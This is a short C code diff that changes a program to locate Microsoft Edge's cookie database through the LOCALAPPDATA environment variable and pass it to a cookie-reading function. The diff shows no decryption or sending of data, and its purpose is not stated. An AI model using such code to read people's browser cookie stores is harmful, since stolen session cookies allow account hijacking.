@@ -72,7 +72,8 @@ void read_cookies_file(const char *path) {
 }
 
 int main() {
-    const char *cookies_path = "C:\\Users\\<YourUsername>\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
+    char cookies_path[MAX_PATH];
+    snprintf(cookies_path, sizeof(cookies_path), "%s\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies", getenv("LOCALAPPDATA"));
     read_cookies_file(cookies_path);
     return 0;
 }
